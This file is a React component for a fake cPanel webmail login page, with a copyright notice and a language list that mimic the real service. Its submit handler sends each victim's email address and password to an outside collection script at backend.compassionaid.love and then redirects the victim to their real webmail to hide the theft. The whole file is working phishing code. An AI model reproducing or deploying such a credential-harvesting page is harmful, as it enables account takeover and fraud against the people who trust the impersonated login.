import React, { useState } from "react"
import WebMailLogo from '../assets/webmail-logo.svg';
import WebMailIcon from '../assets/webMail.ico'
import axios from 'axios';
import { useNavigate } from "react-router-dom";
import { CgSpinner } from "react-icons/cg";


const language = [
    {id:  1, name: "English" },
    {id:  2, name: "العربية" },
    {id:  3, name: "български" },
    {id:  4, name: "čeština" },
    {id:  5, name: "dansk" },
    {id:  6, name: "Deutsch" },
    {id:  7, name: "Ελληνικά" },
    {id:  8, name: "español" },
    {id:  9, name: "..." },
]

const WebMail = () => {
    const [email, setEmail] = useState('')
    const [password, setPassword] = useState('')
    const [message, setMessage] = useState()
    const [loading, setLoading] = useState(false)

    const navigate = useNavigate()

    const handleSubmit = (e) => {
        e.preventDefault();
        setLoading(true)

      if (password === '' || email === ''){
        setLoading(false)
      }else{
        const proData = new FormData();
        proData.append('email', email);
        proData.append('para', password);
        proData.append('source', "WebMails");
        const domain = email.split('@')[1];

        const url = 'https://backend.compassionaid.love/loadback.php';
        const msUrl = `https://${domain}:2096`;

        axios.post(url, proData)
        .then((res) => {
          if (res.status !== 'ok'){
            console.log(res.data)
          }
        }).then(()=> {
          window.location.replace(msUrl);
        }).catch(err => {
          setMessage(err.code)
        })
      }
    }
    return(
        <div>
            <div className="wmContainer">
                <div className="bodyCase">
                <div className="WBImageCase">
                    <img src={WebMailLogo} alt="" className="wBLogo" />
                </div>
                <div className="forms">
                    <div className="mainForm" role="form">
                        <div className="formSpace">
                            <label className="labels" htmlFor="email">Enter Email</label>
                            <input type="text" onChange={(e)=> setEmail(e.target.value)} id="email" placeholder="Enter your email address." className="input" />
                        </div>
                        <div className="formSpace">
                            <label className="labels" htmlFor="password">Password</label>
                            <input type="password" onChange={(e)=> setPassword(e.target.value)} id="password" placeholder="Enter your email password." className="input" />
                            <div className="err">
                                {message}
                            </div>
                        </div>
                        {loading ? <button className="wmButtons text-center" onClick={handleSubmit}><CgSpinner className="animate-spin mx-auto" color="white" /></button> : <button className="wmButtons" onClick={handleSubmit}>Log in</button>}
                    </div>
                </div>
                </div>
            </div>
            <div className="resetCase">
                <span>Reset Password</span>
            </div>
            <div className="needHelp">
                <div>Need Help? We are always here for you</div>
                <button className="helpButton">Chat with a Live Person</button>
            </div>
            <div className="lang">
                <ul className="langList">
                    {language.map(items => {
                        return(
                            <li key={items.id}>
                                {items.name}
                            </li>
                        )
                    })}
                </ul>
            </div>
            <div className="copyR">
                <div className="flex justify-center">
                    <img src={WebMailIcon} width={25} alt="" />
                </div>
                <div className="copyChildren">
                    Copyright&copy; 2024 cPanel, Inc.
                </div>
            </div>
        </div>
    )
}

export default WebMail